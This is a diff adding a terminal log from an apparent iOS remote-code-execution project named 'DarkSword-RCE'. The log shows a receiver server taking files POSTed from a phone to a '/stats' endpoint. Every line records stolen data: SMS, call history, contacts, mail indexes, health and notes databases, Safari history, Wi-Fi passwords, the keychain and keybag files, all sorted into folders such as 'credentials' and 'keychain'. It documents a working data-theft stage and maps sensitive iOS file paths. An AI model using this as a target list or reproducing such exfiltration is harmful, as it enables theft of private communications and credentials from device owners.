@@ -1,0 +1,139 @@
+work@works-Mac-mini DarkSword-RCE % python3 local_file_receiver.py
+Starting local file receiver server on port 8882
+Files will be saved in the 'uploads' directory.
+Received file: /private/var/mobile/Library/SMS/sms.db
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/communications/sms.db
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:21] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/CallHistoryDB/CallHistory.storedata
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/communications/CallHistory.storedata
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:21] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/communications/AddressBook.sqlitedb
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:22] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/preferences/SystemConfiguration/com.apple.wifi.plist
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/credentials/com.apple.wifi.plist
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:22] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/credentials/com.apple.wifi-private-mac-networks.plist
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:22] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Safari/History.db
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/browser/History.db
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:22] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Safari/Bookmarks.db
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/browser/Bookmarks.db
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:23] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Safari/BrowserState.db
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/browser/BrowserState.db
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:23] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Notes/notes.sqlite
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/personal/notes.sqlite
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:23] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Calendar/Calendar.sqlitedb
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/personal/Calendar.sqlitedb
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:24] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Media/PhotoData/Photos.sqlite
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/personal/Photos.sqlite
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:26] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Health/healthdb.sqlite
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/personal/healthdb.sqlite
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:26] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/preferences/SystemConfiguration/preferences.plist
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/device/preferences.plist
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:26] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/wireless/Library/Preferences/com.apple.commcenter.plist
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/device/com.apple.commcenter.plist
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:27] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/wireless/Library/Databases/CellularUsage.db
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/device/CellularUsage.db
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:27] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Preferences/com.apple.locationd.plist
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/device/com.apple.locationd.plist
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:27] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Preferences/com.apple.mobile.ldbackup.plist
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/device/com.apple.mobile.ldbackup.plist
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:28] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/CoreDuet/People/interactionC.db
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/personal/interactionC.db
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:28] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/PersonalizationPortrait/PPSQLDatabase.db
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/personal/PPSQLDatabase.db
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:28] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Accounts/Accounts3.sqlite
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/accounts/Accounts3.sqlite
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:29] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Mail/Envelope Index
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/email/Envelope Index
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:29] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/Mail/Protected Index
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/email/Protected Index
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:30] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/mobile/Library/FrontBoard/applicationState.db
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/device/applicationState.db
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:30] "POST /stats HTTP/1.1" 200 -
+Received file: /tmp/keychain-2.db
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/keychain/keychain-2.db
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:32] "POST /stats HTTP/1.1" 200 -
+Received file: /tmp/persona.kb
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/keybag/persona.kb
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:32] "POST /stats HTTP/1.1" 200 -
+Received file: /tmp/usersession.kb
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/keybag/usersession.kb
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:32] "POST /stats HTTP/1.1" 200 -
+Received file: /tmp/persona_private.kb
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/keybag/persona_private.kb
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:32] "POST /stats HTTP/1.1" 200 -
+Received file: /tmp/usersession_private.kb
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/keybag/usersession_private.kb
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:33] "POST /stats HTTP/1.1" 200 -
+Received file: /var/wireless/wifi_passwords.txt
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/credentials/wifi_passwords.txt
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:33] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/wireless/wifi_passwords.txt
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/credentials/wifi_passwords.txt
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:33] "POST /stats HTTP/1.1" 200 -
+Received file: /tmp/wifi_passwords.txt
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/credentials/wifi_passwords.txt
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:33] "POST /stats HTTP/1.1" 200 -
+Received file: /private/var/tmp/wifi_passwords.txt
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/credentials/wifi_passwords.txt
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:34] "POST /stats HTTP/1.1" 200 -
+Received file: /var/tmp/wifi_passwords.txt
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/credentials/wifi_passwords.txt
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:34] "POST /stats HTTP/1.1" 200 -
+Received file: /installed_apps.txt
+Saved to: uploads/894A6757-E685-51D5-959F-2B96CF770E7E/system/installed_apps.txt
+--------------------
+192.168.60.129 - - [26/Mar/2026 18:39:34] "POST /stats HTTP/1.1" 200 -
